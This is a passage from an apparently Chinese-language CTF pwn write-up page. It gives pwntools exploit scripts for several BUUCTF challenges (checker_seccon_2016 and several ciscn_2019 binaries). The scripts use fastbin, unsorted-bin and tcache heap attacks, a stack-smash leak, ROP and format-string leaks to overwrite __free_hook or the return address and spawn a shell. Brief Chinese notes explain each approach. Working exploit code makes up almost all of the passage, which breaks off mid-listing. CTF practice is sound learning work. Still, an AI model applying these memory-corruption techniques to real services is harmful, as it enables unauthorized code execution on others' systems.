#idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 88</span><br><span class="line">	libc = main_arena - main_arena_offset</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	execl = libc + lib.symbols['execl']</span><br><span class="line">	execve = libc + lib.symbols['execve']</span><br><span class="line">	add(0x80,"\x13"*0x80) #idx 2 junk chunk</span><br><span class="line">	</span><br><span class="line">	#leak heap base</span><br><span class="line">	payload = p64(0)*11 + p64(0x71)</span><br><span class="line">	add(0x60,"\x14"*0x60) #idx 3</span><br><span class="line">	add(0x60,payload) #idx 4</span><br><span class="line"></span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	show(4)</span><br><span class="line">	heap_base = (u64(sh.recvuntil("\x0a\x2d\x2d",True).ljust(8,"\x00")) >> 16) << 8</span><br><span class="line"></span><br><span class="line">	#modify unsorted bin's bk</span><br><span class="line">	unsorted_bin_attack_addr = main_arena - (0x7f7506f49b20 - 0x7f7506f4b768) - 0x8</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	add(0x80,"\x16"*0x80) #idx 5</span><br><span class="line">	add(0x18,"$0\x00") #idx 6</span><br><span class="line"></span><br><span class="line">	free(5)</span><br><span class="line">	free(3)</span><br><span class="line"></span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 7</span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 8	</span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 9</span><br><span class="line"></span><br><span class="line">		#fastbin attack</span><br><span class="line">	payload = p64(0) + p64(0x91) + p64(main_arena + 88) + p64(unsorted_bin_attack_addr)</span><br><span class="line">	add(0x60,payload)#idx 10</span><br><span class="line"></span><br><span class="line">	add(0x80,p64(0xdeadbeef))#idx 11</span><br><span class="line">	</span><br><span class="line">	free(7)</span><br><span class="line">	free(8)</span><br><span class="line">	free(9)</span><br><span class="line"></span><br><span class="line">	#fastbin attack modify __free_hook</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 12</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 13	</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 14</span><br><span class="line"></span><br><span class="line">	payload  = "\x00"*3 + p64(0) * 5 + p64(execve)</span><br><span class="line">	add(0x60,payload)</span><br><span class="line">	#input()</span><br><span class="line">	free(6)</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">	log.success("execl: " + hex(execl))</span><br><span class="line">	#x/50gx (long long)(&main_arena) - 0x1b</span><br><span class="line">	#x/50gx (long long)(&__free_hook) - 0x50</span><br><span class="line">	#execl  execlexecle</span><br><span class="line">	#x/50gx *0x6020C0</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	#buuoj.cn 20149</span><br><span class="line">	pwn("buuoj.cn",20149,1)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x27-checker-seccon-2016"><a href="#0x27-checker-seccon-2016" class="headerlink" title="0x27 checker_seccon_2016"></a>0x27 checker_seccon_2016</h2><h3 id="首先这题开启了canary，且代码无法leak-canary，导致无法溢出"><a href="#首先这题开启了canary，且代码无法leak-canary，导致无法溢出" class="headerlink" title="首先这题开启了canary，且代码无法leak canary，导致无法溢出"></a>首先这题开启了canary，且代码无法leak canary，导致无法溢出</h3><h3 id="考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据"><a href="#考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据" class="headerlink" title="考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据"></a>考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</h3><h3 id="由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60"><a href="#由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60" class="headerlink" title="由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60"></a>由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</h3><h3 id="如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可"><a href="#如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可" class="headerlink" title="如何找到argv[0]，只需调试器附加运行的程序，然后找到./文件名的字符串即可，比如我这里是./checker_seccon_2016，然后将flag的地址覆盖进去即可"></a>如何找到argv[0]，只需调试器附加运行的程序，然后找到<code>./文件名</code>的字符串即可，比如我这里是<code>./checker_seccon_2016</code>，然后将flag的地址覆盖进去即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("checker_seccon_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./checker_seccon_2016")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.recvuntil("Hello! What is your name?\nNAME : ")</span><br><span class="line">	sh.sendline("fuckyou")</span><br><span class="line">	sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">	payload  = "\xaa" * 376</span><br><span class="line">	payload += "\xc0\x10\x60"</span><br><span class="line">	sh.sendline(payload+"\x11\x11\x11")</span><br><span class="line">	sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">	sh.sendline(payload+"\x11\x11")</span><br><span class="line">	sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">	sh.sendline(payload+"\x11")</span><br><span class="line">	sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil("Do you know flag?\n>> ")</span><br><span class="line">	sh.sendline("yes")</span><br><span class="line">	sh.recvuntil("\nOh, Really??\nPlease tell me the flag!\nFLAG : ")</span><br><span class="line">	sh.sendline("fuckyou")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20066,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x28-ciscn-2019-ne-5"><a href="#0x28-ciscn-2019-ne-5" class="headerlink" title="0x28 ciscn_2019_ne_5"></a>0x28 ciscn_2019_ne_5</h2><h3 id="典型的ROP题，ret2text"><a href="#典型的ROP题，ret2text" class="headerlink" title="典型的ROP题，ret2text"></a>典型的ROP题，ret2text</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_ne_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_ne_5")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline('administrator')</span><br><span class="line">	sh.recvuntil('0.Exit\n:')</span><br><span class="line">	offset = 76</span><br><span class="line">	binsh = 0x080482E6 + 0x4</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	payload = offset * 'a' + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	sh.recvuntil('Please input new log info:')</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil("0.Exit\n:")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20171,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x29-ciscn-2019-es-2"><a href="#0x29-ciscn-2019-es-2" class="headerlink" title="0x29 ciscn_2019_es_2"></a>0x29 ciscn_2019_es_2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("ciscn_s_4")</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_s_4")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop3_ret = 0x08048699</span><br><span class="line">	pop2_ret = 0x0804869a</span><br><span class="line">	offset = 44</span><br><span class="line">	main_addr = 0x080485FF</span><br><span class="line">	payload = (offset-12) * 'a' + p32(0x0804A01C) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	payload = (offset-0x10) * "b"+"5"*4 +p32(0x0804A01C)+"7"*4+"8"*4 +p32(0x0804861D)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.recv(33-4-4)</span><br><span class="line">	libc = u32(sh.recv(4)) - lib.symbols["__libc_start_main"]</span><br><span class="line">	log.success("libc :" + hex(libc))</span><br><span class="line">	system = 0x08048559</span><br><span class="line">	binsh = libc + next(lib.search("/bin/sh"))</span><br><span class="line">	log.success("binsh :"+hex(binsh))</span><br><span class="line">	log.success("system :"+hex(libc + lib.symbols['system']))</span><br><span class="line">	#input()</span><br><span class="line">	payload = (offset)*"a" + p32(0x08048450)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload = (offset-12) * 'a' + p32(binsh) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	payload = (offset-0x10) * "b"+"5"*4 +p32(binsh)+"7"*4+"8"*4 +p32(system)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	#sh.recvuntil("Hello, ")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20174,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x30-ciscn-2019-final-3"><a href="#0x30-ciscn-2019-final-3" class="headerlink" title="0x30 ciscn_2019_final_3"></a>0x30 ciscn_2019_final_3</h2><h3 id="这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell"><a href="#这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell" class="headerlink" title="这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell"></a>这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</h3><h3 id="简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell"><a href="#简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell" class="headerlink" title="简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell"></a>简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_final_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    sh.recvuntil("choice > ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("input the index")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil("input the size")</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil("now you can write something")</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil("gift :0x")</span><br><span class="line">    return int(sh.recvuntil("\n",True),16)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil("choice > ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("input the index")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_final_3")</span><br><span class="line">        lib = ELF('libc.so.6')</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF('libc.so.6')</span><br><span class="line">    addr1 = add(0,0x78,"\x11" * 0x78)</span><br><span class="line">    heap_base = addr1 - 0x11E70</span><br><span class="line">    addr2 = add(1,0x0,'')</span><br><span class="line">    add(2,0x78,'\x33' * 0x78)</span><br><span class="line">    add(3,0x78,'\x44' * 0x78)</span><br><span class="line">    add(4,0x78,'\x55' * 0x78)</span><br><span class="line">    add(5,0x78,'\x66' * 0x78)</span><br><span class="line">    add(6,0x78,'\x77' * 0x78)</span><br><span class="line">    add(7,0x78,'\x88' * 0x78)</span><br><span class="line">    add(8,0x78,'/bin/sh\x00')</span><br><span class="line">    add(9,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(10,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(11,0x78,'\xbb' * 0x78)</span><br><span class="line">    free(11)</span><br><span class="line">    free(11)</span><br><span class="line">    add(12,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(13,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(14,0x78,p64(0) + p64(0x4A1))</span><br><span class="line">    free(0)</span><br><span class="line">    free(1)</span><br><span class="line">    add(15,0x78,'\xaa' * 0x78)</span><br><span class="line">    add(16,0,'')</span><br><span class="line">    main_arena = add(17,0,'')</span><br><span class="line">    libc = main_arena - 0x3EBCA0</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    add(18,0x28,p64(0xdeadbeef))</span><br><span class="line">    free(18)</span><br><span class="line">    free(18)</span><br><span class="line">    add(19,0x28,p64(__free_hook))</span><br><span class="line">    add(20,0x28,p64(__free_hook))</span><br><span class="line">    add(21,0x28,p64(system))</span><br><span class="line">    free(8)</span><br><span class="line">    log.success('addr1 = ' + hex(addr1))</span><br><span class="line">    log.success('addr2 = ' + hex(addr2))</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("main_arena: " + hex(main_arena))</span><br><span class="line">    log.success('system: ' + hex(system))</span><br><span class="line">    log.success('__free_hook: ' + hex(__free_hook))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20232,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x31-ciscn-2019-en-3"><a href="#0x31-ciscn-2019-en-3" class="headerlink" title="0x31 ciscn_2019_en_3"></a>0x31 ciscn_2019_en_3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_en_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Please input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Please input the size of story:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("please inpute the story:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil("What's your name?")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">	sh.recvuntil("ID")</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_en_3")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	inputName("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00")</span><br><span class="line">	sh.recvuntil("(nil)(nil)")</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	libc = int(sh.recvuntil("0x",True),16) - 0x78439</span><br><span class="line">	sh.recv(68)</span><br><span class="line">	base = int(sh.recv(12),16) - 0xA00</span><br><span class="line">	chunk_list = base + 0x202060</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	canary = int(sh.recv(16),16)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	ebp = int(sh.recvuntil("Please",True),16)</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	fastbin_attack_addr1 = ebp - 0x58</span><br><span class="line">	fastbin_attack_addr2 = ebp - 0x30</span><br><span class="line">	pop_rdi_ret = 0x0000000000000f83 + base</span><br><span class="line">	inputID(p64(0x61))</span><br><span class="line">	add(0x50,"\x11")</span><br><span class="line">	add(0x50,"\x11")</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">	add(0x40,"\x11")</span><br><span class="line">	add(0x40,"\x11")</span><br><span class="line">	free(6)</span><br><span class="line">	free(7)</span><br><span class="line">	free(6)</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	#input()</span><br><span class="line">	add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">	#x/50gx (long long)(&main_arena) - 0x30</span><br><span class="line">	sh.recvuntil("Input your choice:")</span><br><span class="line">	sh.sendline("6")</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("base: " + hex(base))</span><br><span class="line">	log.success("chunk_list: " + hex(chunk_list))</span><br><span class="line">	log.success("ebp: " + hex(ebp))</span><br><span class="line">	log.success("canary: " + hex(canary))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("fastbin_attack_addr1: " + hex(fastbin_attack_addr1))</span><br><span class="line">	log.success("fastbin_attack_addr2: " + hex(fastbin_attack_addr2))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("f.buuoj.cn",20124,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x32-ciscn-2019-c-5"><a href="#0x32-ciscn-2019-c-5" class="headerlink" title="0x32 ciscn_2019_c_5"></a>0x32 ciscn_2019_c_5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 